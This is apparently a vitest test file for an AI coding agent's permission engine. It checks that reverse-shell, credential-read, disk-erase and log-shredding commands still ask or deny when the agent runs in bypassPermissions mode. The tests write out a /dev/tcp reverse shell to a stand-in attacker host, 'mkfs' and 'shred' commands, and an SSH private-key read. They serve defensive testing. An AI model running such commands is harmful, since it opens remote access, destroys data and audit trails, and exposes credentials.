/**
 * §3 "неотключаемые действия" pins at the engine / checker layer.
 *
 *   - 3.2 immune-set-is-derived: BYPASS_IMMUNE_SAFETY_CATEGORIES is exactly
 *     (HARD_BLOCKED \ final-deny) ∪ {privateRuntimeData}, computed from the
 *     registries — never hand-listed.
 *   - 3.4 bypass-final-deny-stays-deny: final-deny categories deny in
 *     bypassPermissions on BOTH policyOwner paths (engine + core).
 *   - 3.5 bypass-soft-and-subcommand-allow: SOFT risks and `npm publish`
 *     stay ALLOW in bypass.
 *   - 3.1 (engine level): the step-1f action and a
 *     BYPASS_IMMUNE_SAFETY_CATEGORIES category (reverse-shell) produce a
 *     bypass-immune ASK in every mode, and the step-1g net keeps
 *     category-immune safety asks in bypass while ordinary safety asks
 *     still fall through to the bypass allow.
 */

import { describe, expect, it } from 'vitest';

import {
  BYPASS_IMMUNE_SAFETY_CATEGORIES,
  HARD_BLOCKED_CATEGORIES,
  hardBlockedCategoryIsFinalDeny,
} from '../../../src/classifier/dangerous-patterns.js';
import { PermissionEngine, type ToolPermissionChecker } from '../../../src/engine.js';
import { createToolPermissionContext } from '../../../src/context.js';
import { registerDefaultCheckers } from '../../../src/tools/index.js';

type Mode = 'default' | 'auto' | 'bypassPermissions';

function contextFor(mode: Mode) {
  return createToolPermissionContext({
    mode,
    workingDirectory: '/workspace',
    dataDir: '/private/data',
    homeDir: '/home/user',
    platform: 'linux',
    shellFamily: 'posix',
    isFile: () => false,
    rules: [],
  });
}

function realEngine(): PermissionEngine {
  const engine = new PermissionEngine();
  registerDefaultCheckers(engine);
  return engine;
}

// ---------------------------------------------------------------------------
// 3.2 immune-set-is-derived
// ---------------------------------------------------------------------------

describe('BYPASS_IMMUNE_SAFETY_CATEGORIES (3.2 immune-set-is-derived)', () => {
  it('equals (HARD_BLOCKED \\ final-deny) ∪ {privateRuntimeData}', () => {
    const derived = new Set(
      [...HARD_BLOCKED_CATEGORIES]
        .filter((category) => !hardBlockedCategoryIsFinalDeny(category))
        .concat(['privateRuntimeData']),
    );
    expect(new Set(BYPASS_IMMUNE_SAFETY_CATEGORIES)).toEqual(derived);
  });

  it('contains the non-final HARD ask categories and privateRuntimeData only', () => {
    // Snapshot pins the concrete composition; any change must go through
    // HARD_BLOCKED_CATEGORIES / hardBlockedCategoryIsFinalDeny, not this set.
    expect([...BYPASS_IMMUNE_SAFETY_CATEGORIES].sort()).toEqual(
      [
        'system-secret',
        'ssh-credential',
        'sensitive-read',
        'encoding-bypass',
        'reverse-shell',
        'privateRuntimeData',
      ].sort(),
    );
  });

  it('excludes every final-deny category and the bypass-waivable fs categories', () => {
    for (const category of HARD_BLOCKED_CATEGORIES) {
      if (hardBlockedCategoryIsFinalDeny(category)) {
        expect(BYPASS_IMMUNE_SAFETY_CATEGORIES.has(category)).toBe(false);
      }
    }
    // SOFT / subcommand / protected-file style categories stay waivable.
    for (const category of [
      'protectedFile',
      'protectedDirectory',
      'gitDirectory',
      'noMatchingPermissionRule',
      'npm/yarn/pnpm/bun publish (remote registry publish)',
    ]) {
      expect(BYPASS_IMMUNE_SAFETY_CATEGORIES.has(category)).toBe(false);
    }
  });
});

// ---------------------------------------------------------------------------
// 3.4 / 3.5 bypass verdicts with the real checkers
// ---------------------------------------------------------------------------

describe.each(['engine', 'core'] as const)('bypass verdicts (policyOwner=%s)', (policyOwner) => {
  it('3.4 bypass-final-deny-stays-deny: disk-erase denies without a request', () => {
    const engine = realEngine();
    const decision = engine.checkPermission(
      'bash',
      { command: 'mkfs.ext4 /dev/sda1' },
      contextFor('bypassPermissions'),
      { policyOwner },
    );
    expect(decision.behavior).toBe('deny');
  });

  it('3.4 bypass-final-deny-stays-deny: irrecoverable-delete denies without a request', () => {
    const engine = realEngine();
    const decision = engine.checkPermission(
      'bash',
      { command: 'shred /var/log/audit.log' },
      contextFor('bypassPermissions'),
      { policyOwner },
    );
    expect(decision.behavior).toBe('deny');
  });

  it('3.5 bypass-soft-and-subcommand-allow: SOFT risk still allows in bypass', () => {
    const engine = realEngine();
    const decision = engine.checkPermission(
      'bash',
      { command: 'python3 -c "print(1)"' },
      contextFor('bypassPermissions'),
      { policyOwner },
    );
    expect(decision.behavior).toBe('allow');
  });

  it('3.5 bypass-soft-and-subcommand-allow: npm publish still allows in bypass', () => {
    const engine = realEngine();
    const decision = engine.checkPermission(
      'bash',
      { command: 'npm publish' },
      contextFor('bypassPermissions'),
      { policyOwner },
    );
    expect(decision.behavior).toBe('allow');
  });
});

// ---------------------------------------------------------------------------
// 3.1 immune asks in every mode (engine level, real checkers)
// ---------------------------------------------------------------------------

describe.each(['default', 'auto', 'bypassPermissions'] as const)(
  '3.1 immune-asks-in-every-acp-mode (engine, mode=%s)',
  (mode) => {
    it.each([['engine'], ['core']] as const)(
      'step-1f action: ssh-credential read (%s owner)',
      (policyOwner) => {
        const engine = realEngine();
        const decision = engine.checkPermission(
          'read',
          { path: '/home/user/.ssh/id_rsa' },
          contextFor(mode),
          { policyOwner },
        );
        expect(decision.behavior).toBe('ask');
        expect(decision.bypassImmune).toBe(true);
      },
    );

    it.each([['engine'], ['core']] as const)(
      'reverse-shell category: /dev/tcp payload (%s owner)',
      (policyOwner) => {
        const engine = realEngine();
        const decision = engine.checkPermission(
          'bash',
          { command: 'bash -i >& /dev/tcp/evil.example.com/4444 0>&1' },
          contextFor(mode),
          { policyOwner },
        );
        expect(decision.behavior).toBe('ask');
        expect(decision.bypassImmune).toBe(true);
      },
    );
  },
);

// ---------------------------------------------------------------------------
// Step-1g category net (stub checker)
// ---------------------------------------------------------------------------

describe.each(['engine', 'core'] as const)('step 1g category net (policyOwner=%s)', (policyOwner) => {
  function stubChecker(result: {
    category?: string;
    bypassImmune?: boolean;
  }): ToolPermissionChecker {
    return {
      checkPermissions: () => ({
        behavior: 'ask' as const,
        reason: {
          type: 'safetyCheck' as const,
          description: `synthetic safety check (${result.category ?? 'none'})`,
          ...(result.category ? { category: result.category } : {}),
        },
        ...(result.bypassImmune ? { bypassImmune: true } : {}),
      }),
    };
  }

  it('immune category ask survives bypass as bypassImmune + skipAutoClassifier', () => {
    const engine = new PermissionEngine();
    engine.registerToolPermissionChecker('synthetic', stubChecker({ category: 'reverse-shell' }));
    const decision = engine.checkPermission('synthetic', {}, contextFor('bypassPermissions'), {
      policyOwner,
    });
    expect(decision.behavior).toBe('ask');
    expect(decision.bypassImmune).toBe(true);
    expect(decision.skipAutoClassifier).toBe(true);
  });

  it('immune category ask is flagged in every mode (not only bypass)', () => {
    const engine = new PermissionEngine();
    engine.registerToolPermissionChecker(
      'synthetic',
      stubChecker({ category: 'privateRuntimeData' }),
    );
    for (const mode of ['default', 'auto', 'bypassPermissions'] as const) {
      const decision = engine.checkPermission('synthetic', {}, contextFor(mode), { policyOwner });
      expect(decision.behavior).toBe('ask');
      expect(decision.bypassImmune).toBe(true);
      expect(decision.skipAutoClassifier).toBe(true);
    }
  });

  it('ordinary safety category ask still falls through to the bypass allow', () => {
    const engine = new PermissionEngine();
    engine.registerToolPermissionChecker(
      'synthetic',
      stubChecker({ category: 'noMatchingPermissionRule' }),
    );
    const decision = engine.checkPermission('synthetic', {}, contextFor('bypassPermissions'), {
      policyOwner,
    });
    expect(decision.behavior).toBe('allow');
    expect(decision.reason).toMatchObject({
      type: 'mode',
      mode: 'bypassPermissions',
    });
  });

  it('category-less safety ask still falls through to the bypass allow', () => {
    const engine = new PermissionEngine();
    engine.registerToolPermissionChecker('synthetic', stubChecker({}));
    const decision = engine.checkPermission('synthetic', {}, contextFor('bypassPermissions'), {
      policyOwner,
    });
    expect(decision.behavior).toBe('allow');
  });

  it('final-deny category is not in the immune set: checker deny wins in bypass', () => {
    const engine = new PermissionEngine();
    engine.registerToolPermissionChecker('synthetic', {
      checkPermissions: () => ({
        behavior: 'deny' as const,
        reason: {
          type: 'safetyCheck' as const,
          description: 'synthetic final deny',
          category: 'disk-erase',
        },
      }),
    });
    const decision = engine.checkPermission('synthetic', {}, contextFor('bypassPermissions'), {
      policyOwner,
    });
    expect(decision.behavior).toBe('deny');
  });

  it('a whole-tool ask rule does not mask the immune category (ask stays bypass-immune)', () => {
    const askRuleContext = (mode: Mode) =>
      createToolPermissionContext({
        mode,
        workingDirectory: '/workspace',
        dataDir: '/private/data',
        homeDir: '/home/user',
        platform: 'linux',
        shellFamily: 'posix',
        isFile: () => false,
        rules: [{ source: 'global', ruleBehavior: 'ask', ruleValue: { toolName: 'synthetic' } }],
      });
    for (const mode of ['default', 'auto', 'bypassPermissions'] as const) {
      const immune = new PermissionEngine();
      immune.registerToolPermissionChecker(
        'synthetic',
        stubChecker({ category: 'privateRuntimeData' }),
      );
      const decision = immune.checkPermission('synthetic', {}, askRuleContext(mode), {
        policyOwner,
      });
      // The rule owns the reason, the category still owns the immunity.
      expect(decision.behavior).toBe('ask');
      expect(decision.reason).toMatchObject({ type: 'rule' });
      expect(decision.bypassImmune).toBe(true);
      expect(decision.skipAutoClassifier).toBe(true);
    }

    // Control: the same rule over an ordinary safety category stays a plain
    // rule ask (the bypass ask-gate may still downgrade it).
    const ordinary = new PermissionEngine();
    ordinary.registerToolPermissionChecker(
      'synthetic',
      stubChecker({ category: 'noMatchingPermissionRule' }),
    );
    const plain = ordinary.checkPermission('synthetic', {}, askRuleContext('bypassPermissions'), {
      policyOwner,
    });
    expect(plain.behavior).toBe('ask');
    expect(plain.bypassImmune).toBeUndefined();
  });
});
